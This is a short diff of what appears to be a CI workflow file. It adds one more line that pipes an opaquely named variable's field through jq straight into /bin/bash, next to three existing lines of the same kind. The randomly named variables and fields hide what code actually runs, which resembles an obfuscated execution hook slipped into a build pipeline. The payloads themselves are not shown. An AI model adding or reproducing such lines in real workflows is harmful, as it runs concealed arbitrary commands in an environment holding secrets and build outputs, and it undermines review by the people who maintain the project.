@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$hvdrn91" | jq -r .ozp98 | /bin/bash
           printf '%s' "$w9" | jq -r .f2 | /bin/bash
           echo $kim273 | jq -r .utrcw83081 | /bin/bash
+          echo $vr7173 | jq -r .d9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
